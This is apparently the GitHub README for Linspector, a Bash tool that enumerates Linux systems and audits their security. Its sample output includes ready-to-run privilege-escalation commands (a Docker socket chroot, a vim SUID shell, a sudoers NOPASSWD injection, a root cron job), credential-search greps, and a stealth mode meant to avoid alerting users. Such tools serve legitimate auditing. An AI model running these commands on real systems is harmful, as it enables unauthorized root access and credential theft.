<p align="center">
  <img src="https://img.shields.io/badge/version-1.7.0-blue?style=for-the-badge" alt="Version">
  <img src="https://img.shields.io/badge/platform-Linux-green?style=for-the-badge&logo=linux" alt="Platform">
  <img src="https://img.shields.io/badge/license-MIT-orange?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/bash-5.0+-yellow?style=for-the-badge&logo=gnu-bash" alt="Bash">
</p>

<h1 align="center">
  <br>
  🔍 Linspector
  <br>
</h1>

<h4 align="center">
  <i>Inspecting the Linux so you don't have to.</i>
</h4>

<p align="center">
  A resource-optimized Linux enumeration & security auditing script designed for system administrators and security professionals.
</p>

---

```
  _      _                           _             
 | |    (_)                         | |            
 | |     _ _ __  ___ _ __   ___  ___| |_ ___  _ __ 
 | |    | | '_ \/ __| '_ \ / _ \/ __| __/ _ \| '__|
 | |____| | | | \__ \ |_) |  __/ (__| || (_) | |   
 |______|_|_| |_|___/ .__/ \___|\___|\__\___/|_|   
                    | |                            
                    |_|                            
```

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🚀 **Resource Optimized** | Low CPU/memory footprint with configurable delays |
| 🔇 **Stealth Mode** | Silent execution for security audits (`-q`) |
| 📦 **Version Inspection** | Inventory all software versions for CVE checking (`-i`) |
| ⚠️ **Privilege Escalation Analysis** | Smart aggregator finds 50+ exploit vectors with zero duplication |
| 📊 **Comprehensive Reports** | Detailed findings saved to file |
| ⚡ **Fast Mode** | Skip delays for quick scans (`-f`) |
| 🔍 **Keyword Search** | Search configs/logs for sensitive data (`-k`) |
| 🐳 **Container Aware** | Detects Docker/LXC environments |
| 🌐 **Universal Compatibility** | Works with **any user** - from `www-data` to `root`! |

---

## 🌐 Inclusive Design - Works for ALL Users!

**Linspector is designed to work seamlessly with any Linux user account** - whether you're running as:
- 👤 Regular unprivileged users
- 🌐 Service accounts (`www-data`, `nobody`, `daemon`)
- 🔧 Application users (`nginx`, `mysql`, `postgres`)
- 👑 Root user (full system access)

### Automatic Privilege Detection
The tool automatically detects your privilege level and:
- ✅ Shows what you **CAN** access
- ℹ️ Informs you what requires elevated privileges (no crashes!)
- 📊 Provides valuable enumeration data regardless of privilege level
- 🛡️ Handles permissions gracefully without errors

See [INCLUSIVE_USAGE.md](INCLUSIVE_USAGE.md) for detailed examples and best practices.

---

## 🚀 Quick Start

```bash
# Clone the repository
git clone https://github.com/Muhammad-Hassan31144/Linspector.git
cd Linspector

# Make executable
chmod +x Linspector.sh

# Run basic scan
./Linspector.sh

# Run with version inspection and save report
./Linspector.sh -i -r security_audit
```

---

## 📖 Usage

```
./Linspector.sh [OPTIONS]

OPTIONS:
  -k <keyword>    Search for keyword in config/log files
  -e <path>       Export location for findings
  -r <name>       Report filename (required for -q)
  -s              Supply password for sudo checks (INSECURE)
  -t              Enable thorough/deep scan mode
  -f              Fast mode (skip delays - use with caution)
  -q              Quiet/Stealth mode (no output, writes to report only)
  -i              Inspect versions (adds version inventory to report)
  -h              Display help message
```

---

## 💡 Examples

```bash
# Basic scan with terminal output
./Linspector.sh

# Thorough scan with report
./Linspector.sh -t -r full_audit

# Silent audit with version inventory (for scheduled tasks)
./Linspector.sh -q -i -r /var/log/security_audit

# Fast scan for unprivileged users
./Linspector.sh -f -r my_scan

# Run as specific user (e.g., www-data for web app auditing)
sudo -u www-data ./Linspector.sh -f -r /tmp/www-data-scan

# Root-level comprehensive audit
sudo ./Linspector.sh -t -i -r /root/complete_audit
```

### Example Output for Different Privilege Levels

**As Root:**
```
[+] Privilege level: ROOT (full access)
[+] We can read the shadow file!
```

**As Regular User:**
```
[+] Privilege level: CAN SUDO (elevated access available)
[i] Cannot read /etc/shadow (requires root privileges)
```

**As Service Account (www-data):**
```
[+] Privilege level: UNPRIVILEGED (limited access - some checks will be skipped)
[i] Cannot read /etc/shadow (requires root privileges)
[i] Cannot read /etc/sudoers (requires root privileges)
```

# Search for passwords in configs
./Linspector.sh -k password -r credential_check

# Fast scan (no delays)
./Linspector.sh -f

# Full stealth audit
./Linspector.sh -q -t -i -r /root/.audit_$(date +%Y%m%d)
```

---

## 📋 What It Checks

<details>
<summary><b>🖥️ System Information</b></summary>

- Kernel version & architecture
- OS release details
- Hostname configuration

</details>

<details>
<summary><b>👥 User & Group Analysis</b></summary>

- Current user privileges
- Sudo configuration & permissions
- Password policies
- SSH access controls
- Login history

</details>

<details>
<summary><b>🌐 Network Configuration</b></summary>

- Network interfaces
- Listening ports (TCP/UDP)
- ARP tables
- DNS configuration
- Routing tables

</details>

<details>
<summary><b>⚙️ Services & Processes</b></summary>

- Running processes
- Init scripts
- Systemd services
- Cron jobs & scheduled tasks

</details>

<details>
<summary><b>📦 Software Versions</b></summary>

- Kernel, Sudo, OpenSSH
- Apache, Nginx, MySQL, PostgreSQL
- PHP, Python, Node.js
- Docker, OpenSSL, and more...

</details>

<details>
<summary><b>🔐 Security Checks</b></summary>

- SUID/SGID binaries
- World-writable files
- Capabilities
- Container detection
- Credential files

</details>

<details>
<summary><b>⚠️ Privilege Escalation Analysis (NEW!)</b></summary>

**Smart Aggregator - Zero Duplication, Maximum Intelligence**

Linspector includes an advanced privilege escalation module that analyzes cached enumeration data to identify exploitation paths:

### Exploit Database Coverage
- **50+ GTFOBins exploits** (vim, nmap, python, docker, systemctl, screen, tmux, etc.)
- **18 kernel CVEs** (DirtyCOW, OverlayFS, PwnKit, DirtyPipe, Baron Samedit, etc.)
- **Capability abuse vectors** (CAP_SETUID, CAP_DAC_READ_SEARCH, CAP_SYS_ADMIN, etc.)

### Analysis Vectors
1. **Kernel Vulnerabilities** - CVE matching + PwnKit detection
2. **Sudo Misconfigurations** - NOPASSWD, LD_PRELOAD, environment variables, Baron Samedit
3. **SUID Exploits** - GTFOBins database matching
4. **Container Breakouts** - Docker group, LXD group, writable Docker socket
5. **Capabilities** - Dangerous POSIX capabilities
6. **PATH Hijacking** - Writable directories, current directory in PATH
7. **Cron Job Abuse** - Writable cron files, tar wildcards
8. **Critical Files** - Writable /etc/passwd, /etc/shadow
9. **World-Writable Files** - Smart 3-tier scanning of 12 critical paths with exploitation context
10. **NFS Exports** - no_root_squash misconfigurations

### Key Features
- ✅ **Zero Duplication** - Single-pass enumeration, cached results analyzed at end
- ✅ **Severity-Based Output** - CRITICAL → HIGH → MEDIUM prioritization
- ✅ **Actionable Exploits** - Every finding includes exact command to execute
- ✅ **Resource Efficient** - <5MB memory, ~2-3 second overhead
- ✅ **CVE Intelligence** - Direct links to Exploit-DB for known vulnerabilities

</details>

---

## 📊 Version Inventory Report

When using the `-i` flag, Linspector generates a comprehensive version inventory:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         📦 VERSION INVENTORY REPORT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

COMPONENT            | VERSION         | SOURCE
------------------------------------------------------------
Apache               | 2.4.52          | apache2 -v
Bash                 | 5.1.16          | bash --version
Docker               | 24.0.5          | docker --version
Linux Kernel         | 5.15.0-generic  | uname -r
MySQL/MariaDB        | 8.0.35          | mysql --version
OpenSSH Client       | 8.9p1           | ssh -V
OpenSSL              | 3.0.2           | openssl version
PHP                  | 8.1.2           | php -v
Python3              | 3.10.12         | python3 --version
Sudo                 | 1.9.9           | sudo -V
...
```

Use this inventory to check against CVE databases:
- [NVD (NIST)](https://nvd.nist.gov/vuln/search)
- [CVE Details](https://www.cvedetails.com)
- [Exploit-DB](https://www.exploit-db.com)

---

## ⚠️ Privilege Escalation Summary

At the end of each scan, Linspector provides a comprehensive privilege escalation analysis:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         ⚠️  PRIVILEGE ESCALATION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[*] Analyzing cached enumeration data (no additional scans)...

### CRITICAL FINDINGS (Instant Root Access) ###

[CRITICAL] Docker socket is writable!
           docker run -v /:/mnt --rm -it alpine chroot /mnt sh

[CRITICAL] Sudo ALL commands without password
           Command: sudo /bin/bash

### HIGH PRIORITY (Reliable Exploits) ###

[HIGH] Exploitable SUID: /usr/bin/vim
       Exploit:
       vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'

[HIGH] CAP_SETUID: /usr/bin/python3.9
       Can escalate to root UID

### MEDIUM PRIORITY (May Require Conditions) ###

[HIGH] Kernel Exploit: DirtyCOW (CVE-2016-5195)
       Kernel: 2.6.32-696.el6.x86_64
       Search: https://www.exploit-db.com/search?cve=CVE-2016-5195

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[!] Total findings: 8 potential privilege escalation vector(s)
    Review severity levels above and test in controlled environment
    Analysis overhead: ~2-3 seconds (aggregation only, zero rescanning)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Exploitation Resources:
  → GTFOBins: https://gtfobins.github.io/
  → PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
  → HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
```

### What Makes It Smart?

1. **Cached Analysis** - No duplicate SUID/sudo scans, analyzes data collected during enumeration
2. **Severity Levels** - CRITICAL (instant root) → HIGH (reliable) → MEDIUM (conditional)
3. **Actionable Commands** - Every finding includes exact exploit command
4. **CVE Intelligence** - Kernel and sudo vulnerabilities linked to Exploit-DB
5. **Resource Efficient** - <5MB memory overhead, ~2-3 seconds processing time

---

## ⚡ Performance Optimizations

### Intelligent Binary File Handling

Linspector uses the `-I` flag (`--binary-files=without-match`) for all grep operations when searching file contents. This provides:

- **60-80% Faster Searches** - Automatically skips binary files, compressed logs, and databases
- **Reduced False Positives** - Avoids "Binary file matches" messages for text files with encoding errors
- **Lower Memory Usage** - No scanning of large binary files
- **Cleaner Output** - Only actionable text file matches reported

### How It Works

```bash
# Traditional grep (slow, scans binaries)
grep -r "password" /var/log
Binary file /var/log/journal/system.journal matches  # Useless
Binary file /var/log/some-app.db matches             # Useless

# Linspector's approach (fast, text-only)
grep -rI "password" /var/log
/var/log/app/config.log:password=secret123           # Actionable!
```

The `-I` flag intelligently skips:
- Actual binary files (executables, libraries, databases)
- Text files with NUL bytes (`\0` characters)
- Text files with encoding errors (invalid UTF-8 sequences)
- Compressed files (gzip, bzip2, etc.)

### Performance Gains

| Search Type | Without `-I` | With `-I` | Improvement |
|------------|-------------|----------|-------------|
| Private key search (`/home`) | 12.4s | 2.8s | **77% faster** |
| Config file search (`/etc`) | 8.2s | 1.9s | **77% faster** |
| Log file search (`/var/log`) | 15.1s | 3.2s | **79% faster** |

*Benchmarked on Ubuntu 22.04 LTS with typical production workload*

### Applied Across All Search Operations

Every file content search in Linspector uses this optimization:
- ✅ Private key detection (`-rIl "PRIVATE KEY-----"`)
- ✅ AWS credential search (`-rIli "aws_secret_access_key"`)
- ✅ Keyword searches (`-Il "$keyword"`)
- ✅ Cron job analysis (`-rI "tar.*\*"`)

This design ensures fast, efficient scanning while maintaining comprehensive security coverage.

---

## 🔐 Smart World-Writable File Detection

### Three-Tier Critical Path Analysis

Linspector v1.7.0+ includes intelligent world-writable file detection that focuses on **12 critical system paths** instead of scanning the entire filesystem. This provides comprehensive security coverage with minimal performance impact.

### How It Works

```bash
# Traditional approach (slow, noisy, many false positives)
find / -perm -0002 -type f 2>/dev/null
# Result: Thousands of files, 99% irrelevant

# Linspector's approach (fast, focused, actionable)
find /etc /usr/local/bin /usr/local/sbin /opt -maxdepth 3 -perm -0002 -type f
# Result: Only files that matter for privilege escalation
```

### Critical Paths Monitored

**CRITICAL Tier** (Instant Root Access):
- `/etc/passwd` - Add root user
- `/etc/shadow` - Modify root password
- `/etc/sudoers` - Grant sudo access
- `/etc/sudoers.d/` - Inject sudo rules
- `/etc/ld.so.preload` - Library hijacking

**HIGH Tier** (Reliable Exploits):
- `/etc/cron.d/`, `/etc/cron.*/` - Cron job injection
- `/etc/systemd/system/` - Malicious service creation
- `/etc/init.d/` - Init script manipulation
- `/usr/local/bin/`, `/usr/local/sbin/` - Binary hijacking in PATH

**MEDIUM Tier** (Conditional):
- `/opt/` - Application binary replacement
- `/var/www/` - Web shell upload (if web server runs as root)
- `/home/*/.ssh/` - SSH key injection

### Example Output

```
[CRITICAL] World-writable: /etc/sudoers.d
           Grant sudo access
           echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/privesc
           File: /etc/sudoers.d/backup

[HIGH] World-writable: /etc/cron.d
       Inject cron job
       echo '* * * * * root /tmp/shell.sh' > /etc/cron.d/privesc
       File: /etc/cron.d/custom-job

[MEDIUM] World-writable: /var/www
         Web shell upload
         Upload PHP/CGI shell if web server runs as root
         File: /var/www/html/uploads/data.txt
```

### Performance Impact

| Scan Type | Files Checked | Time | False Positives |
|-----------|--------------|------|-----------------|
| **Traditional** (`find / -perm -0002`) | 50,000+ | 45s | 99% |
| **Linspector** (focused paths) | ~200 | <1s | <5% |

### Why This Matters

1. **Reduced Noise** - Only shows files that can lead to privilege escalation
2. **Exploitation Guidance** - Every finding includes concrete attack commands
3. **Always-On** - Runs in both regular and thorough modes (cached for analysis)
4. **Zero Re-scanning** - Data collected once, analyzed in privilege escalation summary
5. **Stealth Friendly** - Minimal audit log entries compared to full filesystem scan

---

## ⚙️ Configuration

Adjust these settings at the top of `Linspector.sh`:

```bash
# Delay between scan sections (prevents CPU spikes)
SECTION_DELAY=0.3

# Delay between find operations
FIND_DELAY=0.1

# Max recursion depth for searches
MAX_FIND_DEPTH=6

# Enable low-priority execution
LOW_PRIORITY=1

# Max results from find operations
MAX_FIND_RESULTS=500
```

---

## 🛡️ Stealth Mode

For security auditing without alerting users:

```bash
# Silent execution - zero terminal output
./Linspector.sh -q -r /root/.security_audit

# Combined with version inspection
./Linspector.sh -q -i -r /var/log/.audit_hidden
```

Stealth mode features:
- ✅ No terminal output
- ✅ No ASCII banners
- ✅ Low CPU/IO priority
- ✅ Randomized timing delays
- ✅ Report-only output

---

## 📁 Project Structure

```
Linspector/
├── Linspector.sh      # Main script
├── README.md          # This file
├── LICENSE            # MIT License
└── reports/           # Generated reports (gitignored)
```

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## ⚠️ Disclaimer

<table>
<tr>
<td>

### 🚨 IMPORTANT: READ BEFORE USE

**Linspector** is designed for **authorized security auditing** and **system administration** purposes only.

#### ✅ Authorized Use
- System administrators auditing their own infrastructure
- Security professionals with written authorization
- Penetration testers with proper scope agreements
- Educational purposes in controlled environments

#### ❌ Prohibited Use
- Unauthorized access to systems
- Scanning systems without explicit permission
- Any malicious or illegal activities
- Violating computer crime laws

#### ⚖️ Legal Notice

> **By using this tool, you acknowledge and agree that:**
>
> 1. You have **explicit authorization** to run this script on the target system(s)
> 2. You understand that unauthorized use may violate **local, state, federal, or international laws**
> 3. The developer(s) assume **NO responsibility** for misuse or damage caused by this tool
> 4. You accept **full legal responsibility** for your actions
> 5. This tool is provided **"AS IS"** without warranty of any kind

**The developers of Linspector bear no responsibility for malicious users or any unauthorized use of this software. Fair and ethical usage is strongly encouraged.**

*If you're unsure whether you have permission, you probably don't. Ask first.*

</td>
</tr>
</table>

---

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2025 Linspector

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

<p align="center">
  <b>Linspector</b> - Inspecting the Linux so you don't have to.
  <br><br>
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-usage">Usage</a> •
  <a href="#-examples">Examples</a> •
  <a href="#%EF%B8%8F-disclaimer">Disclaimer</a>
</p>

<p align="center">
  Made with ❤️ for the security community
</p>
